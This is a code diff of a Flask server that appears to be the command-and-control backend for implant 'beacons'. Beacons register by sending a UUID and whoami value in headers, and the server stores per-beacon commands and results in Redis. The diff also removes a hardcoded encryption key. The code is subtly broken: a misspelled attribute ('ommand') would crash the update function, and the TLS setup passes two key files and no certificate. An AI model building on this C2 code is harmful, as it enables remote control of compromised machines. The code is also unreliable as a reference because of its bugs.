@@ -1,24 +1,44 @@
-# beacons checking in supply a UUID that is hashed
-# the hash is compared to a precompiled list of them?
-# the uuid is stored in memory in a table
-# but how are commands stored and retrieved
-# maybe the tables are each named after the beacon
-# so use postgresql to create a series of tables in a db
-# the flask webserver sees the UUID then performs a fetch from the db
-# e z p z
-import base64
 import sys
 from datetime import datetime
 from flask import *
 import json
 import redis
 import string
-from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+from dataclasses import dataclass
+import API.redis_calls
 
-key = b'12345678901234567890123456789012'  # A 256 bit (32 byte) key
+@dataclass
+class dbParameters:
+    WhoAmI: str
+    Nonce: float
+    Signature: str
+    Retrieved: int  # Reset retrieved so we know the command was picked up
+    Command: str
+    LastInteraction: str
+    LastCheckIn: str
+    Result: str
+    GotIt: int
+
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 app = Flask(__name__)
+
+
+def updateDB(data_struct, uuid):
+    structure = {
+        "WhoAmI": data_struct.WhoAmI,
+        "Nonce": data_struct.Nonce,
+        "Signature": data_struct.Signature,
+        "Retrieved": data_struct.Retrieved,
+        "Command": data_struct.ommand,
+        "LastInteraction": data_struct.LastInteraction,
+        "LastCheckIn": datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
+        "Result": data_struct.Result,
+        "GotIt": data_struct.GotIt
+    }
+    structure = json.dumps(structure)  # Dump the json
+    # Write the message value to the beacon:UUID key
+    conn.hset('UUID', uuid, structure)
 
 
 @app.route('/', methods=['GET'])
@@ -29,31 +49,14 @@ def home():
     # The beacon receives the initial reg and adds it to the db
     if request.method == 'GET':
         uuid = request.headers['APPSESSIONID']
-        #nonce = request.headers['nonce']
-        #nonce = base64.b64decode(nonce)
         whoami = request.headers['Res']
-        #whoami = base64.b64decode(whoami)
-        #whoami = chacha.decrypt(key, whoami, nonce)
-
+        dataSet = dbParameters(whoami, 0, 0, 0, 0, 0, datetime.today().strftime('%Y-%m-%d %H:%M:%S'), 0, 0)
         if set(uuid).difference(string.ascii_letters + string.digits):
             # We're not going to bother with input sanitization here
             # If we receive special characters just drop it entirely
             pass
         else:
-            structure = {
-                "WhoAmI": f"{whoami}",
-                "Nonce": f"0",
-                "Signature": "0",
-                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
-                "Command": "0",
-                "LastInteraction": "0",
-                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-                "Result": "0",
-                "GotIt": "0"
-            }
-            structure = json.dumps(structure)  # Dump the json
-            # Write the message value to the beacon:UUID key
-            conn.hset('UUID', uuid, structure)
+            updateDB(dataSet, uuid)
             return ''
 
 
@@ -147,8 +150,8 @@ def schema():
 
 
 def serve():
-    context = ('cert.pem', 'key.pem')
-    app.run(host=f"{sys.argv[1]}", port=sys.argv[2])#, ssl_context=context)
+    context = ('../ca.key', '../server.key')
+    app.run(host=sys.argv[1], port=sys.argv[2], ssl_context=context)
 
 
 if __name__ == "__main__":
